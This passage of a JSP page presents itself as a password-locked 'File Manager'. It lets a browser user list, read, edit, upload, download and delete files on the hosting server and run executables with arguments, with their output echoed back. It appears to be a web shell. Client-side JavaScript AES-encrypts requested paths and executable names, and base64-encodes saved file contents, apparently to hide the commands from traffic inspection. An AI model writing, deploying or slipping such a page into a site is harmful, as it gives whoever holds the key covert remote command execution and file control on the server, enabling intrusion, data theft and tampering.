.entry-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:12px}
.entry-meta{font-size:10px;color:var(--muted);flex-shrink:0}
.entry-actions{display:flex;gap:3px;flex-shrink:0;opacity:0;transition:opacity .15s}
.entry:hover .entry-actions{opacity:1}
.entry-drive .entry-name{color:var(--accent2);font-weight:600}
.entry-dir .entry-name{color:var(--accent)}
.entry-exe .entry-name{color:var(--run)}
.entry-file .entry-name{color:var(--text)}
.entry-err{color:var(--err);font-size:11px;padding:6px 10px;font-style:italic}
.act-btn{background:transparent;border:none;color:var(--muted);border-radius:4px;padding:2px 5px;font-size:13px;cursor:pointer;transition:color .1s,background .1s;line-height:1}
.act-btn:hover{color:var(--accent);background:var(--surface2)}
.act-run:hover{color:var(--run);background:var(--surface2)}
.act-dl:hover{color:var(--ok);background:var(--surface2)}
.act-del:hover{color:var(--err);background:var(--surface2)}
.resize-handle{width:4px;background:transparent;cursor:col-resize;flex-shrink:0;transition:background .15s}
.resize-handle:hover,.resize-handle.dragging{background:var(--accent)}
.main{flex:1;overflow:hidden;display:flex;flex-direction:column;min-width:0}
.panel-tabs{display:flex;gap:1px;background:var(--border);flex-shrink:0}
.tab{padding:8px 16px;font-size:12px;font-weight:600;color:var(--muted);cursor:pointer;background:var(--surface2);border:none;transition:color .1s,background .1s;display:flex;align-items:center;gap:6px}
.tab:hover{color:var(--text);background:var(--surface)}
.tab.active{color:var(--text);background:var(--bg)}
.tab .tab-x{font-size:10px;color:var(--muted);margin-left:4px}
.tab:hover .tab-x{color:var(--err)}
.panel-body{flex:1;overflow-y:auto;display:flex;flex-direction:column;padding:14px;background:var(--bg);min-height:0}
.panel-body.panel-hidden{display:none!important}
.panel-welcome{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--dim);gap:10px}
.panel-welcome svg{opacity:.25}
.editor-topbar{display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-shrink:0}
.editor-topbar input{flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:5px 10px;font-family:var(--mono);font-size:12px;outline:none}
.editor-topbar input:focus{border-color:var(--accent)}
textarea.editor{flex:1;min-height:300px;background:var(--surface2);border:1px solid var(--border);color:#c8d4f0;border-radius:6px;padding:10px;font-family:var(--mono);font-size:12px;line-height:1.6;resize:vertical;outline:none;transition:border-color .15s}
textarea.editor:focus{border-color:var(--accent)}
.editor-actions{display:flex;gap:8px;margin-top:10px;flex-shrink:0}
.exec-topbar{display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-shrink:0}
.exec-path{flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--run);border-radius:5px;padding:5px 10px;font-family:var(--mono);font-size:12px;outline:none}
.exec-args-row{display:flex;gap:8px;margin-bottom:10px;flex-shrink:0;align-items:center}
.exec-args-row label{font-size:11px;color:var(--muted);white-space:nowrap}
.exec-args-row input{flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:5px 10px;font-family:var(--mono);font-size:12px;outline:none}
.exec-args-row input:focus{border-color:var(--accent)}
pre.console{flex:1;min-height:60px;max-height:420px;background:#050810;border:1px solid var(--border);color:#7dff9a;border-radius:6px;padding:10px;font-family:var(--mono);font-size:12px;line-height:1.55;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
.exec-actions{display:flex;gap:8px;margin-top:10px;flex-shrink:0}
.btn{display:inline-flex;align-items:center;gap:5px;padding:5px 12px;border:none;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer;transition:filter .15s,transform .1s;white-space:nowrap}
.btn:active{transform:scale(.97)}
.btn:hover{filter:brightness(1.12)}
.btn-sm{padding:3px 9px;font-size:11px}
.btn-primary{background:var(--accent);color:#fff}
.btn-ghost{background:var(--surface2);color:var(--text);border:1px solid var(--border)}
.btn-danger{background:#3a1a1a;color:var(--err);border:1px solid #5a2a2a}
.btn-success{background:#0e3028;color:var(--ok);border:1px solid #1e5040}
.btn-run{background:#2a1e08;color:var(--run);border:1px solid #5a3e10}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:var(--muted)}
</style>
</head>
<body>
<form id="fm" method="post" action="<%= request.getRequestURI() %>">

  <input type="hidden" name="__CDDIR"        id="hCdDir"/>
  <input type="hidden" name="__RDFILE"       id="hRdFile"/>
  <input type="hidden" name="__RUNEXE"       id="hRunExe"/>
  <input type="hidden" name="__DELFILE"      id="hDelFile"/>
  <input type="hidden" name="hPath"          id="hPath"/>
  <input type="hidden" name="hFilename"      id="hFilename"/>
  <input type="hidden" name="hExePath"       id="hExePath"/>
  <input type="hidden" name="hDownloadPath"  id="hDlPath"/>
  <input type="hidden" name="hExePathPlain"  id="hExePathPlain"/>
  <input type="hidden" name="hFilenamePlain" id="hFnPlain"/>
  <input type="hidden" name="hContentPlain"  id="hConPlain"/>
  <% if (isAuth) { %>
  <input type="hidden" name="__ACTION" id="hAction"/>
  <% } %>

  <% if (!isAuth) { %>
  <input type="hidden" name="__ACTION" value="login"/>
  <div class="login-wrap">
    <div class="login-box">
      <div class="login-title">&#128193; File Manager</div>
      <div class="login-sub">Enter your access key to continue</div>
      <div class="login-field">
        <label>Access Key</label>
        <input type="password" name="userKey" placeholder="••••••••" autocomplete="off"/>
      </div>
      <% if (showMsg && "err".equals(msgKind)) { %>
        <div class="login-err"><%= htmlEncode(msgText) %></div>
      <% } %>
      <button type="submit" class="btn-login">Unlock</button>
    </div>
  </div>
  <% } else { %>

  <div class="topbar">
    <span class="topbar-logo">&#128193; File Manager</span>
    <span class="topbar-path"><%= htmlEncode(finalCwd) %></span>
    <% if (showMsg) { %>
      <span class="topbar-msg msg-<%= msgKind %>"><%= htmlEncode(msgText) %></span>
    <% } %>
    <button type="button" class="btn-logout" onclick="_clearHidden();_setAction('logout');document.getElementById('fm').submit();">Lock</button>
  </div>

  <div class="layout">
    <div class="sidebar" id="sidebar">
      <div class="sidebar-nav">
        <button type="button" class="btn btn-ghost btn-sm" onclick="_clearHidden();_setAction('up');document.getElementById('fm').submit();">Up</button>
        <button type="button" class="btn btn-primary btn-sm" onclick="_clearHidden();_setAction('new');document.getElementById('fm').submit();">New File</button>
      </div>
      <div class="sidebar-search">
        <input type="text" id="filterInput" placeholder="Filter files..." oninput="FM.filter(this.value)" autocomplete="off"/>
      </div>
      <div class="sidebar-upload">
        <input type="file" id="uploadFileInput" class="upload-input"/>
        <button type="button" class="btn btn-ghost btn-sm" onclick="doUpload(this)">Upload</button>
      </div>
      <div class="sidebar-list" id="sidebarList">
        <%= listing.toString() %>
      </div>
      <div class="cd-row">
        <input type="text" id="visPath" placeholder="Go to path..." autocomplete="off"
               onkeydown="if(event.key==='Enter') FM.go();"/>
        <button type="button" class="btn btn-ghost btn-sm" onclick="FM.prepGo();">Go</button>
      </div>
    </div>

    <div class="resize-handle" id="resizeHandle"></div>

    <div class="main">
      <div class="panel-tabs">
        <button type="button" class="tab" id="tabWelcome" onclick="FM.showPanel('welcome')">Browse</button>
        <button type="button" class="tab" id="tabEditor" onclick="FM.showPanel('editor')" style="display:none">
          <span id="tabEditorName">Editor</span>
          <span class="tab-x" onclick="FM.closeTab('editor',event)">x</span>
        </button>
        <button type="button" class="tab" id="tabExec" onclick="FM.showPanel('exec')" style="display:none">
          <span id="tabExecName">Execute</span>
          <span class="tab-x" onclick="FM.closeTab('exec',event)">x</span>
        </button>
      </div>

      <div id="panelWelcome" class="panel-body">
        <div class="panel-welcome">
          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
            <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/>
          </svg>
          <p>Select a file from the sidebar to open it.</p>
          <p style="font-size:11px;color:var(--dim)">Hover a row to see Read / Download / Run buttons.</p>
        </div>
      </div>

      <div id="panelEditor" class="panel-body panel-hidden">
        <div class="editor-topbar">
          <span style="font-size:11px;color:var(--muted);white-space:nowrap">File:</span>
          <input type="text" id="visFilename" placeholder="filename.txt" value="<%= htmlEncode(finalOpenFile) %>"/>
        </div>
        <textarea id="TxtContent" class="editor"><%= htmlEncode(finalEditorContent) %></textarea>
        <div class="editor-actions">
          <button type="button" class="btn btn-success" onclick="FM.prepSave();">Save</button>
          <button type="button" class="btn btn-danger" onclick="_clearHidden();_setAction('cancelEdit');document.getElementById('fm').submit();">Close</button>
        </div>
      </div>

      <div id="panelExec" class="panel-body panel-hidden">
        <div class="exec-topbar">
          <span style="font-size:11px;color:var(--muted);white-space:nowrap">Exe:</span>
          <input type="text" id="visExePath" class="exec-path" readonly value="<%= htmlEncode(finalRunExe) %>"/>
        </div>
        <div class="exec-args-row">
          <label>Args:</label>
          <input type="text" id="TxtExeArgs" name="exeArgs" placeholder="optional arguments..." value="<%= htmlEncode(finalExeArgs) %>"/>
        </div>
        <% if (finalShowExec) { %>
          <pre class="console"><%= htmlEncode(finalExecOutput) %></pre>
        <% } %>
        <div class="exec-actions">
          <button type="button" class="btn btn-run" onclick="FM.prepExec();">Run</button>
          <button type="button" class="btn btn-danger" onclick="_clearHidden();_setAction('cancelExec');document.getElementById('fm').submit();">Close</button>
        </div>
      </div>
    </div>
  </div>
  <% } %>

<script>
var FM = (function() {
  var _key = null;
  function _initAes(hexKey) {
    if (!hexKey) return;
    _key = new Uint8Array(hexKey.length / 2);
    for (var i = 0; i < hexKey.length; i += 2) _key[i/2] = parseInt(hexKey.substr(i,2),16);
    _buildTables();
  }
  var _sb=[],_m2=[],_m3=[],_rcon=[];
  function _buildTables() {
    var p=1,q=1;
    do {
      p=p^(p<<1)^(p&0x80?0x1B:0);p&=0xFF;
      q^=q<<1;q^=q<<2;q^=q<<4;q^=(q&0x80?0x09:0);q&=0xFF;
      _sb[p]=((q^((q<<1)|(q>>7))^((q<<2)|(q>>6))^((q<<3)|(q>>5))^((q<<4)|(q>>4)))^0x63)&0xFF;
    } while(p!==1);
    _sb[0]=0x63;
    for(var i=0;i<256;i++){_m2[i]=i<128?(i<<1)&0xFF:((i<<1)^0x1B)&0xFF;_m3[i]=(_m2[i]^i)&0xFF;}
    var c=1;for(var r=0;r<10;r++){_rcon[r]=c;c=_m2[c];}
  }
  function _expandKey(k) {
    var nk=8,nr=14,w=[];
    for(var i=0;i<nk;i++) w[i]=[k[4*i],k[4*i+1],k[4*i+2],k[4*i+3]];
    for(var i=nk;i<4*(nr+1);i++){
      var t=w[i-1].slice();
      if(i%nk===0) t=[_sb[t[1]]^_rcon[i/nk-1],_sb[t[2]],_sb[t[3]],_sb[t[0]]];
      else if(nk>6&&i%nk===4) t=t.map(function(x){return _sb[x];});
      w[i]=[w[i-nk][0]^t[0],w[i-nk][1]^t[1],w[i-nk][2]^t[2],w[i-nk][3]^t[3]];
    }
    var rk=[];
    for(var i=0;i<=nr;i++) rk[i]=w.slice(4*i,4*i+4);
    return rk;
  }
  function _aesBlock(b,rk) {
    var s=[[],[],[],[]];
    for(var c=0;c<4;c++) for(var r=0;r<4;r++) s[r][c]=b[4*c+r];
    var ark=function(k){for(var c=0;c<4;c++) for(var r=0;r<4;r++) s[r][c]^=k[c][r];};
    var sub=function(){for(var r=0;r<4;r++) for(var c=0;c<4;c++) s[r][c]=_sb[s[r][c]];};
    var shr=function(){for(var r=1;r<4;r++) for(var i=0;i<r;i++){var t=s[r][0];s[r][0]=s[r][1];s[r][1]=s[r][2];s[r][2]=s[r][3];s[r][3]=t;}};
    var mix=function(){for(var c=0;c<4;c++){var a=s[0][c],b=s[1][c],d=s[2][c],e=s[3][c];s[0][c]=_m2[a]^_m3[b]^d^e;s[1][c]=a^_m2[b]^_m3[d]^e;s[2][c]=a^b^_m2[d]^_m3[e];s[3][c]=_m3[a]^b^d^_m2[e];}};
    ark(rk[0]);
    for(var rd=1;rd<=13;rd++){sub();shr();mix();ark(rk[rd]);}
    sub();shr();ark(rk[14]);
    var o=new Uint8Array(16);
    for(var c=0;c<4;c++) for(var r=0;r<4;r++) o[4*c+r]=s[r][c];
    return o;
  }
  function _utf8(str) {
    var out=[];
    for(var i=0;i<str.length;i++){
      var c=str.charCodeAt(i);
      if(c<0x80) out.push(c);
      else if(c<0x800){out.push(0xC0|(c>>6));out.push(0x80|(c&0x3F));}
      else{out.push(0xE0|(c>>12));out.push(0x80|((c>>6)&0x3F));out.push(0x80|(c&0x3F));}
    }
    return new Uint8Array(out);
  }
  function _aesEncrypt(plainText) {
    if (!_key||!plainText) return '';
    var rk=_expandKey(_key),iv=new Uint8Array(16);
    for(var i=0;i<16;i++) iv[i]=Math.floor(Math.random()*256);
    var tb=_utf8(plainText),pad=16-(tb.length%16);
    var buf=new Uint8Array(tb.length+pad);buf.set(tb);
    for(var i=tb.length;i<buf.length;i++) buf[i]=pad;
    var out=new Uint8Array(16+buf.length);out.set(iv,0);
    var prev=iv;
    for(var i=0;i<buf.length;i+=16){
      var blk=new Uint8Array(16);
      for(var j=0;j<16;j++) blk[j]=buf[i+j]^prev[j];
      var enc=_aesBlock(blk,rk);out.set(enc,16+i);prev=enc;
    }
    return btoa(String.fromCharCode.apply(null,out))
      .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
  }
  function _b64(str) {
    try{return btoa(unescape(encodeURIComponent(str)));}catch(e){return btoa(str);}
  }
  function _set(name,val){var h=document.querySelector('[name="'+name+'"]');if(h)h.value=val||'';}
  function _get(id){var el=document.getElementById(id);return el?el.value:'';}
  function showPanel(name) {
    var panels=['welcome','editor','exec'];
    for(var i=0;i<panels.length;i++){
      var p=panels[i];
      var pEl=document.getElementById('panel'+p.charAt(0).toUpperCase()+p.slice(1));
      var tEl=document.getElementById('tab'+p.charAt(0).toUpperCase()+p.slice(1));
      if(pEl) pEl.className=pEl.className.replace(' panel-hidden','')+(p!==name?' panel-hidden':'');
      if(tEl) tEl.className=tEl.className.replace(' active','')+(p===name?' active':'');
    }
  }
  function closeTab(name,e){
    if(e)e.stopPropagation();
    _clearHidden();
    _setAction(name==='editor'?'cancelEdit':'cancelExec');
    document.getElementById('fm').submit();
  }
  function prepGo(){
    _clearHidden();
    _set('hPath',_aesEncrypt(_get('visPath')));
    _setAction('go');
    document.getElementById('fm').submit();
  }
  function prepSave(){
    _set('hFilenamePlain',_get('visFilename'));
    var ta=document.getElementById('TxtContent');
    _set('hContentPlain',ta?_b64(ta.value):'');
    if(ta)ta.value='';
    _setAction('write');
    document.getElementById('fm').submit();
  }
  function prepExec(){
    _clearHidden();
    var path=_get('visExePath');
    _set('hExePath',_aesEncrypt(path));
    _set('hExePathPlain',path);
    _setAction('exec');
    document.getElementById('fm').submit();
  }
  function filter(q){
    q=q.toLowerCase();
    var entries=document.querySelectorAll('#sidebarList .entry');
    for(var i=0;i<entries.length;i++){
      var nm=entries[i].querySelector('.entry-name');
      entries[i].style.display=(!q||(nm&&nm.textContent.toLowerCase().indexOf(q)>=0))?'':'none';
    }
  }
  function go(){
    _set('hPath',_aesEncrypt(_get('visPath')));
    _setAction('go');
    document.getElementById('fm').submit();
  }
  function _initResize(){
    var handle=document.getElementById('resizeHandle');
    var sidebar=document.getElementById('sidebar');
    if(!handle||!sidebar)return;
    var dragging=false,startX,startW;
    handle.addEventListener('mousedown',function(e){
      dragging=true;startX=e.clientX;startW=sidebar.offsetWidth;
      handle.className+=' dragging';
      document.body.style.cursor='col-resize';
    });
    document.addEventListener('mousemove',function(e){
      if(!dragging)return;
      var w=Math.min(500,Math.max(160,startW+(e.clientX-startX)));
      sidebar.style.width=sidebar.style.minWidth=sidebar.style.maxWidth=w+'px';
    });
    document.addEventListener('mouseup',function(){
      if(!dragging)return;dragging=false;
      handle.className=handle.className.replace(' dragging','');
      document.body.style.cursor='';
    });
  }
  function _init(){
    _initAes('<%= authSKey %>');
    _initResize();
    var active='<%= finalPanel %>';
    var editorFile='<%= jsStr(finalOpenFile) %>';
    var execFile='<%= jsStr(finalRunExe) %>';
    var isNew='<%= "1".equals(finalNewFile) ? "true" : "false" %>'==='true';
    if(editorFile||isNew){
      var t=document.getElementById('tabEditor');if(t)t.style.display='';
      var l=document.getElementById('tabEditorName');
      if(l)l.textContent=editorFile?editorFile.split(/[\\\/]/).pop()||'Editor':'New File';
    }
    if(execFile||active==='exec'){
      var t=document.getElementById('tabExec');if(t)t.style.display='';
      var l=document.getElementById('tabExecName');
      if(l)l.textContent=execFile?(execFile.split(/[\\\/]/).pop()||'Execute'):'Execute';
      var ve=document.getElementById('visExePath');
      var hep=document.getElementById('hExePathPlain');
      if(ve&&execFile)ve.value=execFile;
      if(hep&&execFile)hep.value=execFile;
    }
    if(active==='editor'&&(editorFile||isNew))showPanel('editor');
    else if(active==='exec')showPanel('exec');
    else showPanel('welcome');
  }
  if(window.addEventListener)window.addEventListener('load',_init);
  else if(window.attachEvent)window.attachEvent('onload',_init);
  return{showPanel:showPanel,closeTab:closeTab,filter:filter,go:go,prepGo:prepGo,prepSave:prepSave,prepExec:prepExec};
})();

function _setAction(v){var h=document.querySelector('[name="__ACTION"]');if(h)h.value=v||'';}
function _clearEditor(){var ta=document.getElementById('TxtContent');if(ta)ta.value='';}
function _clearHidden(){
  _clearEditor();
  var names=['__CDDIR','__RDFILE','__RUNEXE','__DELFILE','hPath','hFilename','hExePath','hDownloadPath','hExePathPlain','hFilenamePlain','hContentPlain'];
  for(var i=0;i<names.length;i++){var h=document.querySelector('[name="'+names[i]+'"]');if(h)h.value='';}
}
function cdDir(e){_clearHidden();var h=document.querySelector('[name="__CDDIR"]');if(h)h.value=e;document.getElementById('fm').submit();}
function readFile(e){_clearHidden();var h=document.querySelector('[name="__RDFILE"]');if(h)h.value=e;document.getElementById('fm').submit();}
function runExe(e){_clearHidden();var h=document.querySelector('[name="__RUNEXE"]');if(h)h.value=e;document.getElementById('fm').submit();}
function downloadFile(e){_clearHidden();var h=document.querySelector('[name="hDownloadPath"]');if(h)h.value=e;document.getElementById('fm').submit();}
function deleteFile(e,name){
  if(!confirm('Delete "'+name+'"?\n\nThis cannot be undone.'))return;
  _clearHidden();var h=document.querySelector('[name="__DELFILE"]');if(h)h.value=e;
  document.getElementById('fm').submit();
}
function doUpload(btn){
  var input=document.getElementById('uploadFileInput');
  if(!input||!input.files||!input.files.length){alert('No file selected.');return;}
  var file=input.files[0];
  var fd=new FormData();
  fd.append('__ACTION','upload');
  fd.append('uploadFile',file,file.name);
  btn.disabled=true;btn.textContent='Uploading...';
  var xhr=new XMLHttpRequest();
  xhr.open('POST','<%= request.getRequestURI() %>',true);
  xhr.onload=function(){btn.disabled=false;btn.textContent='Upload';window.location.reload();};
  xhr.onerror=function(){btn.disabled=false;btn.textContent='Upload';alert('Upload failed.');};
  xhr.send(fd);
}
</script>
</form>
</body>
</html>
